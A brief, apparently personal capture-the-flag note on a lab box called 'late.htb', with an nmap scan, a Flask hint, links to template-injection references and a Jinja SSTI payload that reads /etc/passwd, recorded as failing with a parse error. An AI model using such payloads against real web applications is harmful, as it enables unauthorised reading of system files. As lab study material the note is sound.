 10.10.11.156 

```
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.73.115
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-14 07:40 EDT
Nmap scan report for 10.129.73.115
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.53 seconds
```

adding http://images.late.htb/ to /etc/hosts

hint is flask

https://medium.com/swlh/hacking-flask-applications-939eae4bffed

for server sid einjection

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

uplaod an image with 

{{ get_flashed_messages.globals.builtins.open("/etc/passwd").read() }}

NOT ABLE TO FEED THIS INTO OCR

Error occured while processing the image: expected token 'end of print statement', got '.'
